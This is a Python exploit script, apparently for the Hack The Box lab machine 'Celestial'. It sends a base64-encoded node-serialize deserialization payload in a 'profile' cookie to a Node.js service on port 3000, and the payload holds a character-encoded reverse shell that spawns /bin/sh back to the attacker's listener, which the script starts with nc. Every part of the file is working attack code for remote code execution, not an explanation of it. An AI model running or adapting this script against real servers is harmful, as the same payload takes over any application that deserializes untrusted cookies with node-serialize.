#!/usr/bin/python3
import os
import sys
import time
import base64
import requests
import threading


class CelestialBackConnect:
    def __init__(self, local_host, local_port):
        self.target_ip = "10.10.10.85"
        self.local_host = local_host
        self.local_port = local_port

    def exploit(self):
        print("[+] Starting listener and triggering backconnect")

        # Start background thread that sleeps for 3 second and performs the backconnect
        thread = threading.Thread(target=self.trigger_backconnect)
        thread.start()

        # Start our listener
        os.system("nc -nvlp " + self.local_port)

    def trigger_backconnect(self):
        # Generate our malicious JSON that emulates a serialised JS object
        malicious_json = self.generate_malicious_json()
        malicious_json_bytes = malicious_json.encode('ascii')
        malicious_json_encoded_bytes = base64.b64encode(malicious_json_bytes)
        malicious_json_encoded_string = malicious_json_encoded_bytes.decode('ascii')

        print("[+] Popping shell in 3, 2, 1...")
        time.sleep(3)
        print("[+] POPPED!")
        requests.get(f"http://{self.target_ip}:3000/", cookies={
            'profile': malicious_json_encoded_string
        })

    def generate_malicious_json(self):
        return '{"username": "test user", "country": "test country", "city": "test city", "num": "_$$ND_FUNC$$_function(){%s}()"}' % self.generate_shellcode()

    # Encodes the characters ready to be used with String.fromCharCode
    def charencode(self, string):
        encoded = ''
        for char in string:
            encoded = encoded + "," + str(ord(char))
        return encoded[1:]

    # Generate the Node.JS reverse shell code using the specified host/port
    # https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
    def generate_shellcode(self):
        shell_skeleton = '''
        var net = require('net');
        var spawn = require('child_process').spawn;
        HOST="%s";
        PORT="%s";
        TIMEOUT="5000";
        if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
        function c(HOST,PORT) {
            var client = new net.Socket();
            client.connect(PORT, HOST, function() {
                var sh = spawn('/bin/sh',[]);
                client.write("Connected!\\n");
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
                sh.stderr.pipe(client);
                sh.on('exit',function(code,signal){
                  client.end("Disconnected!\\n");
                });
            });
            client.on('error', function(e) {
                setTimeout(c(HOST,PORT), TIMEOUT);
            });
        }
        c(HOST,PORT);
        ''' % (self.local_host, self.local_port)

        return "eval(String.fromCharCode(%s))" % (self.charencode(shell_skeleton))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: htb-celestial.py {LHOST} {LPORT}")
        sys.exit(1)

    local_host = sys.argv[1]
    local_port = sys.argv[2]

    celestial = CelestialBackConnect(local_host, local_port)
    celestial.exploit()
